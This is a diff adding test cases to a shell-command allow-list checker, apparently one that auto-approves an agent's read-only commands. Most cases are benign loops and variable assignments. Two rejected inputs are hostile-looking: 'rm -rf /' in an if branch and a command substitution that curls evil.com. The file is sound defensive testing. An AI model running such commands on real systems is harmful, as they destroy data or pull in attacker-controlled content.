@@ -132,6 +132,12 @@ _test_allow 'while read loop' 'while read -r line; do echo "$line"; done' true
 _test_allow 'if/then/fi with safe cmds' 'if [ -f x ]; then cat x; fi' true
 _test_allow 'if/then/else/fi' 'if test -d /tmp; then ls /tmp; else echo missing; fi' true
 _test_allow 'if with unsafe then branch' 'if [ -f x ]; then rm -rf /; fi' false
+_test_allow 'for loop with variable assignment' 'for f in *.md; do name=$(basename "$f" .md); echo "$name"; done' true
+_test_allow 'for loop with basename and head' 'for f in /tmp/agents/*.md; do name=$(basename "$f" .md); first=$(head -1 "$f" | sed "s/^# //"); echo "$name: $first"; done | sort' true
+_test_allow 'for loop with dirname' 'for f in /tmp/skills/*/SKILL.md; do dir=$(dirname "$f"); name=$(basename "$dir"); echo "$name"; done' true
+_test_allow 'variable assignment with unsafe cmd sub' 'for f in *.txt; do data=$(curl http://evil.com); echo "$data"; done' false
+_test_allow 'simple variable assignment' 'x=hello; echo $x' true
+_test_allow 'variable assignment with safe cmd sub' 'ts=$(date +%s); echo "timestamp: $ts"' true
 
 echo ""
 echo "--- Read-only pipeline auto-approve (check 14) ---"
